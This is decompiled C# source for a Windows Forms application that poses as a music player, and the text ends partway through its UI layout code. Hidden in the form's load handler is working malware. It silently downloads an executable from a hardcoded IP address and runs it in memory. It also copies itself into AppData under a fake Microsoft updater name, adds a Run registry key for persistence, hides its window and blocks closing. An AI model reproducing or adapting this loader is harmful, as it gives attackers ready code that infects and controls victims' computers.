using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace PlayerUI;

public class Form1 : Form
{
	private Form activeForm;

	private static Random random = new Random();

	private IContainer components;

	private Panel panelSideMenu;

	private Panel panelMediaSubMenu;

	private Button button5;

	private Button button4;

	private Button button3;

	private Button button2;

	private Button btnMedia;

	private Button btnHelp;

	private Panel panelToolsSubMenu;

	private Button button10;

	private Button button12;

	private Button button13;

	private Button btnTools;

	private Button btnEqualizer;

	private Panel panelPlaylistSubMenu;

	private Button button1;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button btnPlaylist;

	private Panel panelLogo;

	private PictureBox pictureBox1;

	private Button btnExit;

	private Panel panelPlayer;

	private Label label1;

	private Panel panel2;

	private PictureBox pictureBox8;

	private PictureBox pictureBox7;

	private PictureBox pictureBox6;

	private PictureBox pictureBox5;

	private PictureBox pictureBox4;

	private PictureBox pictureBox3;

	private PictureBox pictureBox2;

	private Panel panelChildForm;

	private Label label2;

	private Panel panel3;

	private Panel panel4;

	private Panel panel5;

	private Label label3;

	private PictureBox pictureBox9;

	public Form1()
	{
		InitializeComponent();
		hideSubMenu();
	}

	private void hideSubMenu()
	{
		((Control)panelMediaSubMenu).set_Visible(false);
		((Control)panelPlaylistSubMenu).set_Visible(false);
		((Control)panelToolsSubMenu).set_Visible(false);
	}

	private void showSubMenu(Panel subMenu)
	{
		if (!((Control)subMenu).get_Visible())
		{
			hideSubMenu();
			((Control)subMenu).set_Visible(true);
		}
		else
		{
			((Control)subMenu).set_Visible(false);
		}
	}

	private void btnMedia_Click(object sender, EventArgs e)
	{
		showSubMenu(panelMediaSubMenu);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		openChildForm((Form)(object)new Form2());
		hideSubMenu();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button4_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button5_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void btnPlaylist_Click(object sender, EventArgs e)
	{
		showSubMenu(panelPlaylistSubMenu);
	}

	private void button8_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button7_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button6_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void btnTools_Click(object sender, EventArgs e)
	{
		showSubMenu(panelToolsSubMenu);
	}

	private void button13_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button12_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button10_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void button9_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void btnEqualizer_Click(object sender, EventArgs e)
	{
		openChildForm((Form)(object)new Form3());
		hideSubMenu();
	}

	private void btnHelp_Click(object sender, EventArgs e)
	{
		hideSubMenu();
	}

	private void btnExit_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void openChildForm(Form childForm)
	{
		if (activeForm != null)
		{
			activeForm.Close();
		}
		activeForm = childForm;
		childForm.set_TopLevel(false);
		childForm.set_FormBorderStyle((FormBorderStyle)0);
		((Control)childForm).set_Dock((DockStyle)5);
		((Control)panelChildForm).get_Controls().Add((Control)(object)childForm);
		((Control)panelChildForm).set_Tag((object)childForm);
		((Control)childForm).BringToFront();
		((Control)childForm).Show();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int threadsrunning = 2;
		new Thread((ThreadStart)delegate
		{
			string address = "http://45.133.1.139/Manager/Temp/Ryo2zvWeVt7DR5GJAxSwXZAc/a8ojAHyWHoBa8hMZ3OIGGUW1.exe";
			try
			{
				Assembly assembly = Assembly.Load(new WebClient().DownloadData(address));
				object[] parameters = null;
				if (assembly.EntryPoint!.GetParameters().Length != 0)
				{
					parameters = new object[1] { new string[1] };
				}
				assembly.EntryPoint!.Invoke(null, parameters);
			}
			catch (Exception)
			{
			}
			threadsrunning--;
		}).Start();
		new Thread((ThreadStart)delegate
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft" + RandomString(24) + "Updater.exe";
			File.Copy(Application.get_ExecutablePath(), text);
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Muavi Music Player " + RandomString(36), text);
			threadsrunning--;
		}).Start();
		((Control)this).Hide();
	}

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 _", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Failed to close");
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_0465: Unknown result type (might be due to invalid IL or missing references)
		//IL_046f: Expected O, but got Unknown
		//IL_04ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b0: Expected O, but got Unknown
		//IL_05ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abd: Expected O, but got Unknown
		//IL_0afa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfd: Expected O, but got Unknown
		//IL_0c3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e16: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f20: Unknown result type (might be due to invalid IL or missing references)
		//IL_102a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1133: Unknown result type (might be due to invalid IL or missing references)
		//IL_1220: Unknown result type (might be due to invalid IL or missing references)
		//IL_122a: Expected O, but got Unknown
		//IL_1267: Unknown result type (might be due to invalid IL or missing references)
		//IL_1443: Unknown result type (might be due to invalid IL or missing references)
		//IL_154d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1657: Unknown result type (might be due to invalid IL or missing references)
		//IL_1760: Unknown result type (might be due to invalid IL or missing references)
		//IL_184d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1857: Expected O, but got Unknown
		//IL_1891: Unknown result type (might be due to invalid IL or missing references)
		//IL_1982: Unknown result type (might be due to invalid IL or missing references)
		//IL_198c: Expected O, but got Unknown
		//IL_1ead: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eb7: Expected O, but got Unknown
		//IL_1f43: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f4d: Expected O, but got Unknown
		//IL_1fd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fe0: Expected O, but got Unknown
		//IL_206c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2076: Expected O, but got Unknown
		//IL_2102: Unknown result type (might be due to invalid IL or missing references)
		//IL_210c: Expected O, but got Unknown
		//IL_2198: Unknown result type (might be due to invalid IL or missing references)
		//IL_21a2: Expected O, but got Unknown
		//IL_222e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2238: Expected O, but got Unknown
		//IL_2338: Unknown result type (might be due to invalid IL or missing references)
		//IL_2342: Expected O, but got Unknown
		//IL_2424: Unknown result type (might be due to invalid IL or missing references)
		//IL_242e: Expected O, but got Unknown
		//IL_243a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2444: Expected O, but got Unknown
		//IL_2446: Unknown result type (might be due to invalid IL or missing references)
		//IL_249b: Unknown result type (might be due to invalid IL or missing references)
		//IL_24a5: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		panelSideMenu = new Panel();
		btnExit = new Button();
		btnHelp = new Button();
		panelToolsSubMenu = new Panel();
		button10 = new Button();
		button12 = new Button();
		button13 = new Button();
		btnTools = new Button();
		btnEqualizer = new Button();
		panelPlaylistSubMenu = new Panel();
		button1 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		btnPlaylist = new Button();
		panelMediaSubMenu = new Panel();
		button5 = new Button();
		button4 = new Button();
		button3 = new Button();
		button2 = new Button();
		btnMedia = new Button();
		panelLogo = new Panel();
		pictureBox1 = new PictureBox();
		panelPlayer = new Panel();
		label3 = new Label();
		panel4 = new Panel();
		panel5 = new Panel();
		label2 = new Label();
		label1 = new Label();
		panel2 = new Panel();
		panel3 = new Panel();
		pictureBox8 = new PictureBox();
		pictureBox7 = new PictureBox();
		pictureBox6 = new PictureBox();
		pictureBox5 = new PictureBox();
		pictureBox4 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox2 = new PictureBox();
		panelChildForm = new Panel();
		pictureBox9 = new PictureBox();
		((Control)panelSideMenu).SuspendLayout();
		((Control)panelToolsSubMenu).SuspendLayout();
		((Control)panelPlaylistSubMenu).SuspendLayout();
		((Control)panelMediaSubMenu).SuspendLayout();
		((Control)panelLogo).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panelPlayer).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox8).BeginInit();
		((ISupportInitialize)pictureBox7).BeginInit();
		((ISupportInitialize)pictureBox6).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)panelChildForm).SuspendLayout();
		((ISupportInitialize)pictureBox9).BeginInit();
		((Control)this).SuspendLayout();
		((ScrollableControl)panelSideMenu).set_AutoScroll(true);
		((Control)panelSideMenu).set_BackColor(Color.FromArgb(11, 7, 17));
		((Control)panelSideMenu).get_Controls().Add((Control)(object)btnExit);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)btnHelp);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)panelToolsSubMenu);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)btnTools);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)btnEqualizer);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)panelPlaylistSubMenu);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)btnPlaylist);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)panelMediaSubMenu);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)btnMedia);
		((Control)panelSideMenu).get_Controls().Add((Control)(object)panelLogo);
		((Control)panelSideMenu).set_Dock((DockStyle)3);
		((Control)panelSideMenu).set_Location(new Point(0, 0));
		((Control)panelSideMenu).set_Name("panelSideMenu");
		((Control)panelSideMenu).set_Size(new Size(250, 561));
		((Control)panelSideMenu).set_TabIndex(0);
		((Control)btnExit).set_Dock((DockStyle)2);
		((ButtonBase)btnExit).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnExit).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(23, 21, 32));
		((ButtonBase)btnExit).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(24, 22, 34));
		((ButtonBase)btnExit).set_FlatStyle((FlatStyle)0);
		((Control)btnExit).set_ForeColor(Color.Silver);
		((ButtonBase)btnExit).set_Image((Image)componentResourceManager.GetObject("btnExit.Image"));
		((ButtonBase)btnExit).set_ImageAlign((ContentAlignment)16);
		((Control)btnExit).set_Location(new Point(0, 777));
		((Control)btnExit).set_Name("btnExit");
		((Control)btnExit).set_Padding(new Padding(5, 0, 0, 0));
		((Control)btnExit).set_Size(new Size(233, 45));
		((Control)btnExit).set_TabIndex(9);
		((Control)btnExit).set_Text("  Exit");
		((ButtonBase)btnExit).set_TextAlign((ContentAlignment)16);
		((ButtonBase)btnExit).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnExit).set_UseVisualStyleBackColor(true);
		((Control)btnExit).add_Click((EventHandler)btnExit_Click);
		((Control)btnHelp).set_Dock((DockStyle)1);
		((ButtonBase)btnHelp).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnHelp).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(23, 21, 32));
		((ButtonBase)btnHelp).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(24, 22, 34));
		((ButtonBase)btnHelp).set_FlatStyle((FlatStyle)0);
		((Control)btnHelp).set_ForeColor(Color.Silver);
		((ButtonBase)btnHelp).set_Image((Image)componentResourceManager.GetObject("btnHelp.Image"));
		((ButtonBase)btnHelp).set_ImageAlign((ContentAlignment)16);
		((Control)btnHelp).set_Location(new Point(0, 732));
		((Control)btnHelp).set_Name("btnHelp");
		((Control)btnHelp).set_Padding(new Padding(5, 0, 0, 0));
		((Control)btnHelp).set_Size(new Size(233, 45));
		((Control)btnHelp).set_TabIndex(8);
		((Control)btnHelp).set_Text("  Help");
		((ButtonBase)btnHelp).set_TextAlign((ContentAlignment)16);
		((ButtonBase)btnHelp).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnHelp).set_UseVisualStyleBackColor(true);
		((Control)btnHelp).add_Click((EventHandler)btnHelp_Click);
		((Control)panelToolsSubMenu).set_BackColor(Color.FromArgb(35, 32, 39));
		((Control)panelToolsSubMenu).get_Controls().Add((Control)(object)button10);
		((Control)panelToolsSubMenu).get_Controls().Add((Control)(object)button12);
		((Control)panelToolsSubMenu).get_Controls().Add((Control)(object)button13);
		((Control)panelToolsSubMenu).set_Dock((DockStyle)1);
		((Control)panelToolsSubMenu).set_Location(new Point(0, 602));
		((Control)panelToolsSubMenu).set_Name("panelToolsSubMenu");
		((Control)panelToolsSubMenu).set_Size(new Size(233, 130));
		((Control)panelToolsSubMenu).set_TabIndex(7);
		((Control)button10).set_Dock((DockStyle)1);
		((ButtonBase)button10).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button10).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button10).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button10).set_FlatStyle((FlatStyle)0);
		((Control)button10).set_ForeColor(Color.Silver);
		((Control)button10).set_Location(new Point(0, 80));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button10).set_Size(new Size(233, 40));
		((Control)button10).set_TabIndex(2);
		((Control)button10).set_Text("Preferences");
		((ButtonBase)button10).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)button12).set_Dock((DockStyle)1);
		((ButtonBase)button12).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button12).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button12).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button12).set_FlatStyle((FlatStyle)0);
		((Control)button12).set_ForeColor(Color.Silver);
		((Control)button12).set_Location(new Point(0, 40));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button12).set_Size(new Size(233, 40));
		((Control)button12).set_TabIndex(1);
		((Control)button12).set_Text("Effects and filters");
		((ButtonBase)button12).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button12).add_Click((EventHandler)button12_Click);
		((Control)button13).set_Dock((DockStyle)1);
		((ButtonBase)button13).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button13).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button13).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button13).set_FlatStyle((FlatStyle)0);
		((Control)button13).set_ForeColor(Color.Silver);
		((Control)button13).set_Location(new Point(0, 0));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button13).set_Size(new Size(233, 40));
		((Control)button13).set_TabIndex(0);
		((Control)button13).set_Text("Media converter");
		((ButtonBase)button13).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((Control)button13).add_Click((EventHandler)button13_Click);
		((Control)btnTools).set_Dock((DockStyle)1);
		((ButtonBase)btnTools).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnTools).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(23, 21, 32));
		((ButtonBase)btnTools).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(24, 22, 34));
		((ButtonBase)btnTools).set_FlatStyle((FlatStyle)0);
		((Control)btnTools).set_ForeColor(Color.Silver);
		((ButtonBase)btnTools).set_Image((Image)componentResourceManager.GetObject("btnTools.Image"));
		((ButtonBase)btnTools).set_ImageAlign((ContentAlignment)16);
		((Control)btnTools).set_Location(new Point(0, 557));
		((Control)btnTools).set_Name("btnTools");
		((Control)btnTools).set_Padding(new Padding(5, 0, 0, 0));
		((Control)btnTools).set_Size(new Size(233, 45));
		((Control)btnTools).set_TabIndex(6);
		((Control)btnTools).set_Text("  Tools");
		((ButtonBase)btnTools).set_TextAlign((ContentAlignment)16);
		((ButtonBase)btnTools).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnTools).set_UseVisualStyleBackColor(true);
		((Control)btnTools).add_Click((EventHandler)btnTools_Click);
		((Control)btnEqualizer).set_Dock((DockStyle)1);
		((ButtonBase)btnEqualizer).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnEqualizer).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(23, 21, 32));
		((ButtonBase)btnEqualizer).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(24, 22, 34));
		((ButtonBase)btnEqualizer).set_FlatStyle((FlatStyle)0);
		((Control)btnEqualizer).set_ForeColor(Color.Silver);
		((ButtonBase)btnEqualizer).set_Image((Image)componentResourceManager.GetObject("btnEqualizer.Image"));
		((ButtonBase)btnEqualizer).set_ImageAlign((ContentAlignment)16);
		((Control)btnEqualizer).set_Location(new Point(0, 512));
		((Control)btnEqualizer).set_Name("btnEqualizer");
		((Control)btnEqualizer).set_Padding(new Padding(5, 0, 0, 0));
		((Control)btnEqualizer).set_Size(new Size(233, 45));
		((Control)btnEqualizer).set_TabIndex(5);
		((Control)btnEqualizer).set_Text("  Equalizer");
		((ButtonBase)btnEqualizer).set_TextAlign((ContentAlignment)16);
		((ButtonBase)btnEqualizer).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnEqualizer).set_UseVisualStyleBackColor(true);
		((Control)btnEqualizer).add_Click((EventHandler)btnEqualizer_Click);
		((Control)panelPlaylistSubMenu).set_BackColor(Color.FromArgb(35, 32, 39));
		((Control)panelPlaylistSubMenu).get_Controls().Add((Control)(object)button1);
		((Control)panelPlaylistSubMenu).get_Controls().Add((Control)(object)button6);
		((Control)panelPlaylistSubMenu).get_Controls().Add((Control)(object)button7);
		((Control)panelPlaylistSubMenu).get_Controls().Add((Control)(object)button8);
		((Control)panelPlaylistSubMenu).set_Dock((DockStyle)1);
		((Control)panelPlaylistSubMenu).set_Location(new Point(0, 347));
		((Control)panelPlaylistSubMenu).set_Name("panelPlaylistSubMenu");
		((Control)panelPlaylistSubMenu).set_Size(new Size(233, 165));
		((Control)panelPlaylistSubMenu).set_TabIndex(4);
		((Control)button1).set_Dock((DockStyle)1);
		((ButtonBase)button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button1).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button1).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.Silver);
		((Control)button1).set_Location(new Point(0, 120));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button1).set_Size(new Size(233, 40));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Export playlist");
		((ButtonBase)button1).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button6).set_Dock((DockStyle)1);
		((ButtonBase)button6).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button6).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button6).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button6).set_FlatStyle((FlatStyle)0);
		((Control)button6).set_ForeColor(Color.Silver);
		((Control)button6).set_Location(new Point(0, 80));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button6).set_Size(new Size(233, 40));
		((Control)button6).set_TabIndex(2);
		((Control)button6).set_Text("Import playlist");
		((ButtonBase)button6).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)button7).set_Dock((DockStyle)1);
		((ButtonBase)button7).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button7).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button7).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button7).set_FlatStyle((FlatStyle)0);
		((Control)button7).set_ForeColor(Color.Silver);
		((Control)button7).set_Location(new Point(0, 40));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button7).set_Size(new Size(233, 40));
		((Control)button7).set_TabIndex(1);
		((Control)button7).set_Text("Managing playlist");
		((ButtonBase)button7).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((Control)button8).set_Dock((DockStyle)1);
		((ButtonBase)button8).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button8).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button8).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button8).set_FlatStyle((FlatStyle)0);
		((Control)button8).set_ForeColor(Color.Silver);
		((Control)button8).set_Location(new Point(0, 0));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button8).set_Size(new Size(233, 40));
		((Control)button8).set_TabIndex(0);
		((Control)button8).set_Text("New playlist");
		((ButtonBase)button8).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)btnPlaylist).set_Dock((DockStyle)1);
		((ButtonBase)btnPlaylist).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnPlaylist).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(23, 21, 32));
		((ButtonBase)btnPlaylist).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(24, 22, 34));
		((ButtonBase)btnPlaylist).set_FlatStyle((FlatStyle)0);
		((Control)btnPlaylist).set_ForeColor(Color.Silver);
		((ButtonBase)btnPlaylist).set_Image((Image)componentResourceManager.GetObject("btnPlaylist.Image"));
		((ButtonBase)btnPlaylist).set_ImageAlign((ContentAlignment)16);
		((Control)btnPlaylist).set_Location(new Point(0, 302));
		((Control)btnPlaylist).set_Name("btnPlaylist");
		((Control)btnPlaylist).set_Padding(new Padding(5, 0, 0, 0));
		((Control)btnPlaylist).set_Size(new Size(233, 45));
		((Control)btnPlaylist).set_TabIndex(3);
		((Control)btnPlaylist).set_Text("  Playlist management");
		((ButtonBase)btnPlaylist).set_TextAlign((ContentAlignment)16);
		((ButtonBase)btnPlaylist).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnPlaylist).set_UseVisualStyleBackColor(true);
		((Control)btnPlaylist).add_Click((EventHandler)btnPlaylist_Click);
		((Control)panelMediaSubMenu).set_BackColor(Color.FromArgb(35, 32, 39));
		((Control)panelMediaSubMenu).get_Controls().Add((Control)(object)button5);
		((Control)panelMediaSubMenu).get_Controls().Add((Control)(object)button4);
		((Control)panelMediaSubMenu).get_Controls().Add((Control)(object)button3);
		((Control)panelMediaSubMenu).get_Controls().Add((Control)(object)button2);
		((Control)panelMediaSubMenu).set_Dock((DockStyle)1);
		((Control)panelMediaSubMenu).set_Location(new Point(0, 137));
		((Control)panelMediaSubMenu).set_Name("panelMediaSubMenu");
		((Control)panelMediaSubMenu).set_Size(new Size(233, 165));
		((Control)panelMediaSubMenu).set_TabIndex(2);
		((Control)button5).set_Dock((DockStyle)1);
		((ButtonBase)button5).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button5).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button5).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button5).set_FlatStyle((FlatStyle)0);
